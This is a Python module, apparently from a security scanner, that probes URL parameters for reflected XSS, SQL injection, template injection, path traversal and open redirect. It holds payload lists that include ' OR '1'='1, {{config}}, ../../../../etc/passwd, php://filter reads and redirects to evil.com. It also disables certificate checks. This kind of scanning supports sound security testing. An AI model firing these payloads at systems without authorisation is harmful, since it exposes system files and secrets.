"""tools/injection_tester.py — Automated Injection Vulnerability Tester

Tests for common injection vulnerabilities:
  - Reflected XSS (Cross-Site Scripting)
  - SQL Injection (Error-based, Boolean-based)
  - Server-Side Template Injection (SSTI)
  - Local File Inclusion (LFI) / Path Traversal
  - Open Redirect

Safety:
  - Uses non-destructive, read-only payloads
  - All payloads are canary-based (unique markers for detection)
  - No data modification or deletion payloads
"""

import logging
import re
import uuid
import requests
from typing import Dict, List, Optional
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

logger = logging.getLogger("elengenix.injection")

_TIMEOUT = 10
_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"


# ─────────────────────────────────────────────────
# Payload Definitions
# ─────────────────────────────────────────────────

def _xss_payloads(canary: str) -> List[Dict]:
    """Generate XSS test payloads with unique canary."""
    return [
        {"payload": f'<img src=x onerror="{canary}">', "type": "img_onerror", "detect": canary},
        {"payload": f'"><svg/onload={canary}>', "type": "svg_onload", "detect": canary},
        {"payload": f"javascript:{canary}", "type": "js_proto", "detect": canary},
        {"payload": f"'-{canary}-'", "type": "quote_break", "detect": canary},
        {"payload": f'{canary}<script>', "type": "script_open", "detect": f"{canary}<script>"},
        {"payload": f'{{{{constructor.constructor("return this")()}}}}{canary}',
         "type": "prototype", "detect": canary},
    ]


def _sqli_payloads() -> List[Dict]:
    """Generate SQL injection test payloads (non-destructive)."""
    return [
        # Error-based detection
        {"payload": "' OR '1'='1", "type": "or_true",
         "errors": ["sql", "mysql", "syntax", "oracle", "postgresql", "sqlite",
                     "unterminated", "quoted string", "ORA-", "PG::"]},
        {"payload": "' OR '1'='2", "type": "or_false",
         "errors": []},  # Used for boolean comparison
        {"payload": "1' AND SLEEP(0)-- -", "type": "sleep_zero",
         "errors": ["sql", "mysql", "syntax"]},
        {"payload": "' UNION SELECT NULL--", "type": "union_null",
         "errors": ["sql", "column", "union", "select"]},
        {"payload": "1;SELECT 1", "type": "stacked",
         "errors": ["sql", "syntax", "multiple"]},
        {"payload": "' AND 1=CONVERT(int,(SELECT 1))--", "type": "convert",
         "errors": ["convert", "cast", "type"]},
    ]


def _ssti_payloads() -> List[Dict]:
    """Generate SSTI test payloads."""
    return [
        {"payload": "{{7*7}}", "type": "jinja2_multiply", "detect": "49"},
        {"payload": "${7*7}", "type": "freemarker", "detect": "49"},
        {"payload": "#{7*7}", "type": "ruby_erb", "detect": "49"},
        {"payload": "{{config}}", "type": "jinja2_config",
         "detect_any": ["SECRET_KEY", "DEBUG", "Config", "config"]},
        {"payload": "<%= 7*7 %>", "type": "erb_multiply", "detect": "49"},
    ]


def _lfi_payloads() -> List[Dict]:
    """Generate LFI / Path Traversal payloads."""
    return [
        {"payload": "../../../../etc/passwd", "type": "etc_passwd",
         "detect_any": ["root:", "daemon:", "bin:", "/bin/bash", "/bin/sh"]},
        {"payload": "....//....//....//etc/passwd", "type": "double_dot",
         "detect_any": ["root:", "daemon:"]},
        {"payload": "/etc/passwd%00", "type": "null_byte",
         "detect_any": ["root:", "daemon:"]},
        {"payload": "..\\..\\..\\..\\windows\\win.ini", "type": "win_ini",
         "detect_any": ["[fonts]", "[extensions]", "for 16-bit"]},
        {"payload": "php://filter/convert.base64-encode/resource=index", "type": "php_filter",
         "detect_any": ["PD9waH", "PCFET0"]},  # Base64 of <?ph / <!DO
    ]


def _open_redirect_payloads() -> List[Dict]:
    """Generate Open Redirect payloads."""
    return [
        {"payload": "//evil.com", "type": "protocol_relative"},
        {"payload": "https://evil.com", "type": "absolute"},
        {"payload": "/\\evil.com", "type": "backslash"},
        {"payload": "//evil.com/%2f..", "type": "encoded_slash"},
    ]


# ─────────────────────────────────────────────────
# Test Executors
# ─────────────────────────────────────────────────

def _make_session() -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = _UA
    s.verify = False
    return s


def test_xss(url: str, params: Optional[List[str]] = None) -> List[Dict]:
    """Test URL parameters for reflected XSS."""
    findings = []
    session = _make_session()
    canary = f"xss{uuid.uuid4().hex[:8]}"

    # Parse existing params or use provided list
    parsed = urlparse(url)
    existing_params = list(parse_qs(parsed.query).keys())
    test_params = params or existing_params or ["q", "search", "id", "name", "input"]

    payloads = _xss_payloads(canary)

    for param in test_params:
        for p in payloads:
            try:
                test_url = _inject_param(url, param, p["payload"])
                resp = session.get(test_url, timeout=_TIMEOUT, allow_redirects=False)

                if p["detect"] in resp.text:
                    findings.append({
                        "title": f"Reflected XSS via '{param}' ({p['type']})",
                        "description": (
                            f"Parameter '{param}' reflects payload without sanitization.\n"
                            f"Payload: {p['payload']}\n"
                            f"URL: {test_url}"
                        ),
                        "severity": "high",
                        "type": "xss",
                        "param": param,
                        "payload_type": p["type"],
                        "url": test_url,
                    })
                    break  # One hit per param is enough
            except Exception:
                continue

    session.close()
    return findings


def test_sqli(url: str, params: Optional[List[str]] = None) -> List[Dict]:
    """Test URL parameters for SQL injection."""
    findings = []
    session = _make_session()

    parsed = urlparse(url)
    existing_params = list(parse_qs(parsed.query).keys())
    test_params = params or existing_params or ["id", "user", "page", "category"]

    payloads = _sqli_payloads()

    for param in test_params:
        # Get baseline response
        try:
            baseline_url = _inject_param(url, param, "1")
            baseline = session.get(baseline_url, timeout=_TIMEOUT)
            baseline_len = len(baseline.text)
            baseline_status = baseline.status_code
        except Exception:
            continue

        for p in payloads:
            try:
                test_url = _inject_param(url, param, p["payload"])
                resp = session.get(test_url, timeout=_TIMEOUT)

                # Error-based detection
                if p["errors"]:
                    body_lower = resp.text.lower()
                    for err_pattern in p["errors"]:
                        if err_pattern.lower() in body_lower:
                            findings.append({
                                "title": f"SQL Injection (error-based) via '{param}'",
                                "description": (
                                    f"SQL error detected in response when injecting '{param}'.\n"
                                    f"Payload: {p['payload']}\n"
                                    f"Error indicator: '{err_pattern}'\n"
                                    f"URL: {test_url}"
                                ),
                                "severity": "critical",
                                "type": "sqli",
                                "param": param,
                                "payload_type": p["type"],
                                "url": test_url,
                            })
                            break

                # Boolean-based: compare OR true vs OR false
                if p["type"] == "or_true":
                    true_len = len(resp.text)
                    false_url = _inject_param(url, param, "' OR '1'='2")
                    false_resp = session.get(false_url, timeout=_TIMEOUT)
                    false_len = len(false_resp.text)

                    if abs(true_len - false_len) > 100 and true_len != baseline_len:
                        findings.append({
                            "title": f"SQL Injection (boolean-based) via '{param}'",
                            "description": (
                                f"Significant response difference between true/false conditions.\n"
                                f"TRUE payload length: {true_len}, FALSE: {false_len}, Baseline: {baseline_len}\n"
                                f"URL: {test_url}"
                            ),
                            "severity": "critical",
                            "type": "sqli",
                            "param": param,
                            "payload_type": "boolean",
                            "url": test_url,
                        })

            except Exception:
                continue

        # Deduplicate per param
        seen_params = set()
        unique = []
        for f in findings:
            key = f"{f['param']}:{f['type']}"
            if key not in seen_params:
                seen_params.add(key)
                unique.append(f)
        findings = unique

    session.close()
    return findings


def test_ssti(url: str, params: Optional[List[str]] = None) -> List[Dict]:
    """Test URL parameters for SSTI."""
    findings = []
    session = _make_session()

    parsed = urlparse(url)
    existing_params = list(parse_qs(parsed.query).keys())
    test_params = params or existing_params or ["name", "template", "input", "q"]

    payloads = _ssti_payloads()

    for param in test_params:
        for p in payloads:
            try:
                test_url = _inject_param(url, param, p["payload"])
                resp = session.get(test_url, timeout=_TIMEOUT)

                detected = False
                if "detect" in p and p["detect"] in resp.text:
                    # Make sure it's not just the payload being echoed back
                    if p["payload"] not in resp.text:
                        detected = True
                if "detect_any" in p:
                    for d in p["detect_any"]:
                        if d in resp.text:
                            detected = True
                            break

                if detected:
                    findings.append({
                        "title": f"SSTI ({p['type']}) via '{param}'",
                        "description": (
                            f"Server evaluated template expression in parameter '{param}'.\n"
                            f"Payload: {p['payload']}\n"
                            f"URL: {test_url}"
                        ),
                        "severity": "critical",
                        "type": "ssti",
                        "param": param,
                        "payload_type": p["type"],
                        "url": test_url,
                    })
                    break
            except Exception:
                continue

    session.close()
    return findings


def test_lfi(url: str, params: Optional[List[str]] = None) -> List[Dict]:
    """Test URL parameters for LFI/Path Traversal."""
    findings = []
    session = _make_session()

    parsed = urlparse(url)
    existing_params = list(parse_qs(parsed.query).keys())
    test_params = params or existing_params or ["file", "path", "page", "include",
                                                  "template", "doc", "view", "load"]

    payloads = _lfi_payloads()

    for param in test_params:
        for p in payloads:
            try:
                test_url = _inject_param(url, param, p["payload"])
                resp = session.get(test_url, timeout=_TIMEOUT)

                for indicator in p["detect_any"]:
                    if indicator in resp.text:
                        findings.append({
                            "title": f"LFI/Path Traversal via '{param}' ({p['type']})",
                            "description": (
                                f"Server returned sensitive file contents when traversing via '{param}'.\n"
                                f"Payload: {p['payload']}\n"
                                f"Indicator: '{indicator}' found in response.\n"
                                f"URL: {test_url}"
                            ),
                            "severity": "critical",
                            "type": "lfi",
                            "param": param,
                            "payload_type": p["type"],
                            "url": test_url,
                        })
                        break
            except Exception:
                continue

    session.close()
    return findings


def test_open_redirect(url: str, params: Optional[List[str]] = None) -> List[Dict]:
    """Test URL parameters for Open Redirect."""
    findings = []
    session = _make_session()

    parsed = urlparse(url)
    existing_params = list(parse_qs(parsed.query).keys())
    test_params = params or existing_params or ["redirect", "url", "next", "return",
                                                  "returnTo", "goto", "continue", "callback"]

    payloads = _open_redirect_payloads()

    for param in test_params:
        for p in payloads:
            try:
                test_url = _inject_param(url, param, p["payload"])
                resp = session.get(test_url, timeout=_TIMEOUT, allow_redirects=False)

                if resp.status_code in (301, 302, 303, 307, 308):
                    location = resp.headers.get("Location", "")
                    if "evil.com" in location:
                        findings.append({
                            "title": f"Open Redirect via '{param}' ({p['type']})",
                            "description": (
                                f"Server redirects to attacker-controlled domain.\n"
                                f"Payload: {p['payload']}\n"
                                f"Redirect Location: {location}\n"
                                f"URL: {test_url}"
                            ),
                            "severity": "medium",
                            "type": "open_redirect",
                            "param": param,
                            "payload_type": p["type"],
                            "url": test_url,
                        })
                        break
            except Exception:
                continue

    session.close()
    return findings


# ─────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────

def _inject_param(url: str, param: str, value: str) -> str:
    """Inject or replace a parameter value in a URL."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]

    # Rebuild query string
    flat = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
    new_query = urlencode(flat)

    return urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, new_query, parsed.fragment
    ))


def run_all_injection_tests(
    url: str,
    params: Optional[List[str]] = None,
    tests: Optional[List[str]] = None,
) -> List[Dict]:
    """
    Run all injection tests on a URL.

    Args:
        url: Target URL to test
        params: Specific parameters to test (auto-detected if None)
        tests: Which test types to run (all if None)

    Returns:
        List of vulnerability findings
    """
    all_findings = []
    available_tests = {
        "xss": test_xss,
        "sqli": test_sqli,
        "ssti": test_ssti,
        "lfi": test_lfi,
        "open_redirect": test_open_redirect,
    }

    run_tests = tests or list(available_tests.keys())

    for test_name in run_tests:
        fn = available_tests.get(test_name)
        if fn:
            try:
                print(f"    [{test_name}] Testing {url}...")
                results = fn(url, params)
                all_findings.extend(results)
                if results:
                    print(f"    [{test_name}] Found {len(results)} issue(s)!")
            except Exception as e:
                logger.error(f"Injection test {test_name} failed: {e}")

    return all_findings
